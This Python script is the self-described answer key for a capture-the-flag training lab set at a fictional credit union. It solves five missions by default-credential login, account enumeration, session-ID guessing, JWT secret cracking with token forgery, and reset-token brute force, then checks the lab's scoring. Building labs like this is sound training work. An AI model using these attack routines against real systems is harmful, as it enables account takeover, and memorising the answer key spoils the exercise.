#!/usr/bin/env python3
"""End-to-end check for Harbor Credit Union: Analyst Edition (stdlib only).

    python3 verify/verify.py http://127.0.0.1:5201

Solves every mission with the same techniques a player would use, including a
JWT secret loop and a 1000-value reset-token loop. Then checks the scoring rules.

This folder is the answer key. It is not copied into the image. Run it on a
freshly started lab.
"""
import base64
import hashlib
import hmac
import html
import http.cookiejar
import json
import pathlib
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

BASE = (sys.argv[1] if len(sys.argv) > 1 else 'http://127.0.0.1:5201').rstrip('/')
PLAYER = 'verifier'
ROOT = pathlib.Path(__file__).resolve().parent.parent
FLAG_RE = re.compile(r'HARBOR\{[a-z-]+-[0-9a-f]{8}\}')
failures = []


def check(cond, label):
    print(('PASS ' if cond else 'FAIL ') + label)
    if not cond:
        failures.append(label)


def browser():
    jar = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar)), jar


def page(opener, path, form=None, cookie=None):
    headers = {'Cookie': cookie} if cookie else {}
    data = urllib.parse.urlencode(form).encode() if form is not None else None
    try:
        with opener.open(urllib.request.Request(BASE + path, data=data, headers=headers), timeout=30) as r:
            return r.status, html.unescape(r.read().decode())
    except urllib.error.HTTPError as err:
        return err.code, html.unescape(err.read().decode())


def form_json(opener, path, form):
    data = urllib.parse.urlencode(form).encode()
    req = urllib.request.Request(BASE + path, data=data,
                                 headers={'Content-Type': 'application/x-www-form-urlencoded'})
    try:
        with opener.open(req, timeout=30) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as err:
        return err.code, json.loads(err.read())


def api(method, path, body=None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(BASE + path, data=data, method=method,
                                 headers={'Content-Type': 'application/json'})
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as err:
        return err.code, json.loads(err.read())


def flag_in(text):
    m = FLAG_RE.search(text)
    return m.group(0) if m else None


def b64url_decode(text):
    return base64.urlsafe_b64decode(text + '=' * (-len(text) % 4))


def b64url_encode(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b'=').decode()


def forge_jwt(sub, secret):
    header = b64url_encode(json.dumps({'alg': 'HS256', 'typ': 'JWT'}, separators=(',', ':')).encode())
    payload = b64url_encode(json.dumps({'sub': sub, 'exp': int(time.time()) + 3600},
                                       separators=(',', ':')).encode())
    signing = f'{header}.{payload}'
    sig = b64url_encode(hmac.new(secret.encode(), signing.encode(), hashlib.sha256).digest())
    return f'{signing}.{sig}'


def wait_for_health():
    for _ in range(60):
        try:
            if api('GET', '/health')[0] == 200:
                return
        except OSError:
            pass
        time.sleep(1)
    raise SystemExit('lab never became healthy')


def main():
    wait_for_health()
    plain = urllib.request.build_opener()
    flags = {}

    # --- health and mission shape -------------------------------------------------------------
    status, health = api('GET', '/health')
    first_blood = bool(health.get('first_blood'))
    max_score = health.get('max_score')
    check(status == 200 and health.get('lab') == 'harbor-advanced', 'health says this is the advanced Harbor lab')
    check(health.get('missions') == 5 and max_score == (1250 if first_blood else 1000),
          'health reports five missions and the right maximum score')

    status, missions = api('GET', f'/api/challenges?player={PLAYER}')
    check(status == 200 and [m['slug'] for m in missions] ==
          ['front_desk', 'who_works_here', 'lucky_number', 'remember_me', 'pet_name'],
          'five missions in campaign order')
    check([m['locked'] for m in missions] == [False, True, True, True, True],
          'only the first mission is unlocked at the start')
    check(all(k in missions[0] for k in ('title', 'story', 'goal', 'start_url', 'hints_total',
                                         'points', 'base_points', 'hint_cost', 'hint_costs',
                                         'tool', 'difficulty', 'category')),
          'mission cards carry story, goal, tool and hint costs')
    check(missions[0]['base_points'] == 100 and missions[0]['hint_costs'] == [0, 15, 15],
          'front desk is worth 100 with a free first hint and 15-point later hints')
    check('lesson' not in missions[0] and missions[0]['hints'] == [],
          'lesson and hints stay hidden until earned')

    # --- pages, decoys and wordlists ----------------------------------------------------------
    for path in ('/', '/missions', '/help', '/toolbox', '/bank', '/bank/team', '/bank/login',
                 '/bank/forgot', '/bank/back-office', '/bank/careers', '/bank/news',
                 '/bank/atm', '/bank/rates'):
        check(page(plain, path)[0] == 200, f'page {path} loads')
    check(page(plain, '/bank/staff')[0] == 404, 'the old linked staff URL is gone')
    status, robots = page(plain, '/robots.txt')
    check(status == 200 and 'back-office' not in robots and 'careers' in robots,
          'robots.txt lists decoys but not the real staff path')
    for name in ('paths.txt', 'usernames.txt', 'passwords.txt', 'jwt-secrets.txt',
                 'sessions.txt', 'tokens.txt'):
        status, body = page(plain, f'/static/wordlists/{name}')
        check(status == 200 and len(body) > 10, f'wordlist {name} downloads')
    check('back-office' in page(plain, '/static/wordlists/paths.txt')[1],
          'paths.txt contains the hidden folder')
    check('welcome1' in page(plain, '/static/wordlists/passwords.txt')[1],
          'passwords.txt contains the weak password')
    check('harbor2026' in page(plain, '/static/wordlists/jwt-secrets.txt')[1],
          'jwt-secrets.txt contains the weak signing secret')
    check(len(page(plain, '/static/wordlists/tokens.txt')[1].splitlines()) == 1000,
          'tokens.txt covers 1000-1999')

    # --- Mission 1: hidden staff portal and default login ------------------------------------
    opener, _ = browser()
    status, body = page(opener, '/bank/back-office', {'username': 'admin', 'password': 'wrong'})
    check('not correct' in body, 'staff portal rejects a wrong password')
    status, body = page(opener, '/bank/back-office', {'username': 'admin', 'password': 'admin'})
    flags['front_desk'] = flag_in(body)
    check(flags['front_desk'] is not None, 'mission 1: admin / admin opens the staff dashboard with a flag')
    status, body = page(browser()[0], '/bank/back-office/dashboard')
    check(flag_in(body) is None, 'the staff dashboard stays closed in a fresh browser (state is per trainee)')

    # --- Mission 2: API enumeration and a weak password --------------------------------------
    opener, _ = browser()
    status, data = form_json(opener, '/api/auth/login', {'username': 'morgan', 'password': 'x'})
    check(status == 401 and data.get('reason') == 'unknown_user', 'API says unknown_user for a missing account')
    status, data = form_json(opener, '/api/auth/login', {'username': 'jordan', 'password': 'x'})
    check(status == 401 and data.get('reason') == 'bad_password', 'API says bad_password for a real account')
    status, data = form_json(opener, '/api/auth/login', {'username': 'jordan', 'password': 'welcome1'})
    check(status == 200 and data.get('result') == 'success', 'mission 2: jordan / welcome1 succeeds through the API')
    status, body = page(opener, '/bank/account')
    flags['who_works_here'] = flag_in(body)
    check(flags['who_works_here'] is not None, 'mission 2: the logged-in account shows a flag')

    # --- Mission 3: predictable session IDs --------------------------------------------------
    opener, jar = browser()
    page(opener, '/bank/login', {'username': 'riley', 'password': 'harbor123'})
    cookies = {c.name: c.value for c in jar}
    check(cookies.get('hcu_session', '').isdigit() and int(cookies['hcu_session']) >= 10005,
          'session cookie is a five-digit counter (the weakness)')
    status, body = page(plain, '/bank/account', cookie='hcu_session=10002')
    check(flag_in(body) is None and 'Alex Rivera' in body, 'session 10002 is a decoy (Alex) with no flag')
    status, body = page(plain, '/bank/account', cookie='hcu_session=10003')
    flags['lucky_number'] = flag_in(body)
    check(flags['lucky_number'] is not None and 'Priya Nair' in body,
          'mission 3: session 10003 is the branch manager, with a flag')

    # --- Mission 4: crack and forge a JWT ----------------------------------------------------
    opener, jar = browser()
    page(opener, '/bank/login', {'username': 'riley', 'password': 'harbor123', 'remember': '1'})
    remember = {c.name: c.value for c in jar}.get('hcu_remember', '')
    check(remember.count('.') == 2, 'remember-me cookie is a JWT')
    try:
        header = json.loads(b64url_decode(remember.split('.')[0]))
    except Exception:  # noqa: BLE001 - a malformed token is a failed check, not a crash
        header = {}
    check(header.get('alg') == 'HS256', 'JWT header says HS256')
    secrets_list = (ROOT / 'app/static/wordlists/jwt-secrets.txt').read_text().split()
    found = None
    for secret in secrets_list:
        status, body = page(plain, '/bank/account', cookie=f'hcu_remember={forge_jwt("ceo", secret)}')
        if flag_in(body) and 'Dana Whitfield' in body:
            found = secret
            flags['remember_me'] = flag_in(body)
            break
    check(found == 'harbor2026' and flags.get('remember_me') is not None,
          'mission 4: the wordlist cracks the JWT secret and a forged sub=ceo opens the CEO account')

    # --- Mission 5: brute-force the reset token ----------------------------------------------
    opener, _ = browser()
    status, body = page(opener, '/bank/forgot', {'username': 'sam'})
    check('four-digit code' in body and 'Reset code' in body, 'reset page asks for a four-digit code')
    status, body = page(opener, '/bank/forgot/verify', {'username': 'sam', 'token': '0000'})
    check('not correct' in body, 'a wrong reset code is rejected')
    found_token = None
    for token in range(1000, 2000):
        status, body = page(opener, '/bank/forgot/verify', {'username': 'sam', 'token': str(token)})
        if 'Choose a new password' in body:
            found_token = token
            break
    check(found_token is not None, 'mission 5: the 1000-value loop finds the reset code')
    page(opener, '/bank/forgot/new', {'username': 'sam', 'password': 'analyst-pass-1'})
    status, body = page(opener, '/bank/login', {'username': 'sam', 'password': 'analyst-pass-1'})
    flags['pet_name'] = flag_in(body)
    check(flags['pet_name'] is not None, 'mission 5: logging in as sam with the new password shows a flag')
    other, _ = browser()
    status, body = page(other, '/bank/login', {'username': 'sam', 'password': 'analyst-pass-1'})
    check("isn't right" in body, "another trainee's browser is unaffected by this password reset")

    # --- Scoring: points, hint costs and first blood -----------------------------------------
    status, early = api('POST', '/api/score/submit', {'player': PLAYER, 'flag': flags['who_works_here']})
    check(early['correct'] is False and early.get('locked') is True and 'front desk' in early['message'].lower(),
          'a real flag for a locked mission is not accepted yet, and the message says why')
    status, bad = api('POST', '/api/score/submit', {'player': PLAYER, 'flag': 'HARBOR{nope}'})
    check(bad['correct'] is False and bad['score'] == 0, 'a wrong flag costs nothing')

    status, hint2 = api('POST', '/api/challenges/front_desk/hint', {'player': PLAYER, 'level': 2})
    check(status == 400, 'hints must be opened in order')
    status, hint1 = api('POST', '/api/challenges/front_desk/hint', {'player': PLAYER, 'level': 1})
    check(status == 200 and hint1['cost'] == 0 and hint1['points_now'] == 100 and hint1['levels_total'] == 3,
          'hint 1 is free and does not reduce the mission')
    status, hint2 = api('POST', '/api/challenges/front_desk/hint', {'player': PLAYER, 'level': 2})
    check(status == 200 and hint2['cost'] == 15 and hint2['charged'] is False and hint2['points_now'] == 85,
          'hint 2 costs 15 points from a 100-point mission')
    status, locked_hint = api('POST', '/api/challenges/pet_name/hint', {'player': PLAYER})
    check(status == 403, 'hints for locked missions are closed')
    _, missions = api('GET', f'/api/challenges?player={PLAYER}')
    check(missions[0]['points'] == 85 and missions[0]['hint_costs'] == [0, 15, 15],
          'the mission card shows the reduced value and the hint prices')

    def solve(slug, expected_award):
        status, result = api('POST', '/api/score/submit', {'player': PLAYER, 'flag': flags[slug]})
        award = expected_award + (50 if first_blood else 0)
        check(status == 200 and result['correct'] and result['points_awarded'] == award
              and result['challenge'] == slug and 'lesson' in result,
              f'{slug}: +{award} points and the lesson is revealed')
        if first_blood:
            check(result.get('first_blood') is True and result.get('bonus') == 50,
                  f'{slug}: first blood adds the 50-point bonus')
        else:
            check(result.get('first_blood') is False and result.get('bonus') == 0,
                  f'{slug}: no first-blood bonus when it is off')
        return result

    result = solve('front_desk', 85)
    check(result['hint_penalty'] == 15, 'the solve reports the 15-point hint penalty')
    if not first_blood:
        check(result['rank_title'] == 'Visitor', '85 points is still Visitor')

    for level in (1, 2, 3):
        status, hint = api('POST', '/api/challenges/who_works_here/hint', {'player': PLAYER, 'level': level})
    check(status == 200 and hint['points_now'] == 106 and hint['cost'] == 22,
          'who works here: all three hints leave 106 of 150 points')
    solve('who_works_here', 106)

    solve('lucky_number', 200)
    solve('remember_me', 250)

    for level in (1, 2, 3):
        status, hint = api('POST', '/api/challenges/pet_name/hint', {'player': PLAYER, 'level': level})
    check(status == 200 and hint['points_now'] == 210 and hint['cost'] == 45,
          'forgot my password: all three hints leave the 70% floor (210 of 300)')
    solve('pet_name', 210)

    expected_total = 851 + (250 if first_blood else 0)
    expected_rank = 'Director' if expected_total >= 1000 else 'Manager'
    _, again = api('POST', '/api/score/submit', {'player': PLAYER, 'flag': flags['front_desk']})
    check(again['already_solved'] is True and again['points_awarded'] == 0, 'a repeat submission awards nothing')

    _, me = api('GET', f'/api/players/{PLAYER}')
    check(me['score'] == expected_total, f'all five missions give {expected_total} points with these hints')
    check(me['rank_title'] == expected_rank, f'the final rank is {expected_rank}')
    check(len(me['solved']) == 5 and me['hints_used'] == ['front_desk', 'who_works_here', 'pet_name']
          and me['hints_used_count'] == 8, 'the player record lists five solves and eight hint levels')
    if first_blood:
        check(len(me['first_bloods']) == 5, 'the player record lists five first bloods')
    else:
        check(me['first_bloods'] == [], 'no first bloods are recorded when the bonus is off')

    _, nobody = api('GET', '/api/players/never-played')
    check(nobody['score'] == 0 and nobody['solved'] == [] and nobody['rank_title'] == 'Visitor',
          'unknown players start as Visitor')
    status, _ = api('GET', '/api/players/bad!name')
    check(status == 400, 'invalid player names are rejected')
    _, board = api('GET', '/api/scoreboard')
    check(board[0]['player'] == PLAYER and board[0]['score'] == expected_total,
          'the scoreboard lists the verifier first with the expected score')

    _, unplayed = api('GET', '/api/challenges')
    check([m['locked'] for m in unplayed] == [False, True, True, True, True],
          'challenges without a player still show the campaign locks')

    print()
    if failures:
        print(f'{len(failures)} check(s) failed')
        sys.exit(1)
    print('All Harbor Analyst Edition checks passed')


if __name__ == '__main__':
    main()
